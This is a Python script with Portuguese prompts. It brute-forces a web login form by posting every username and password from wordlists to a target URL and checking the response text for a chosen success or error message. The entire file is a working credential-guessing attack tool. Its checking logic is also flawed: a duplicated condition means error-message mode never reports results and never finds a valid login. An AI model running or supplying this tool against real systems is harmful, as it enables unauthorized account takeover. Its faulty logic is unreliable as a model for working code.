import requests
import sys

# Inputs do usuário
target = input("Digite o URL alvo (ex: 'http://127.0.0.1:5000'): ")
usernames_input = input("Digite um username único ou o caminho para um arquivo de usernames: ")
passwords = input("Digite o caminho para o arquivo de senhas (ex: 'top-100.txt'): ")

# Campos do POST request
username_field = input("Digite o campo de username (ex: 'username'): ")
password_field = input("Digite o campo de senha (ex: 'password'): ")

# Escolha de tipo de mensagem
message_type = input("Deseja configurar mensagem de erro ou de sucesso? ((e)rro / (s)ucesso / (n)ão): ").strip().lower()

if message_type == 's':
    message = input("Digite a mensagem de sucesso (ex: 'Welcome back'): ").strip()
elif message_type == 'e':
    message = input("Digite a mensagem de erro (ex: 'Invalid credentials'): ").strip()
elif message_type == 'n':
    message = ''
else:
    print("Opção inválida, por favor escolha 'erro' ou 'sucesso'.")
    sys.exit()

# Verificando se o input de usernames é um único username ou um arquivo
if usernames_input.endswith(".txt"):
    with open(usernames_input, "r") as file:
        usernames = [line.strip() for line in file]
else:
    usernames = [usernames_input]

# Ler senhas uma vez fora do loop
with open(passwords, "r") as passwords_list:
    passwords = [line.strip() for line in passwords_list]

# Loop através de usernames e senhas
for username in usernames:
    for password in passwords:
        print("[X] Attempting user:password -> {}:{}".format(username, password))

        # Realizando o POST request
        r = requests.post(target, data={username_field: username, password_field: password})

        # Verificando a resposta
        if message in r.text:
            if message_type == 's':
                print("\t[>>>>>] Valid password '{}' found for user '{}'!\n".format(password, username))
                sys.exit()
        elif message in r.text:
            if message_type == 'e':
                print("\t[!] Invalid password '{}' for user '{}'!\n".format(password, username))

    print("\tNo valid password found for '{}'.\n".format(username))
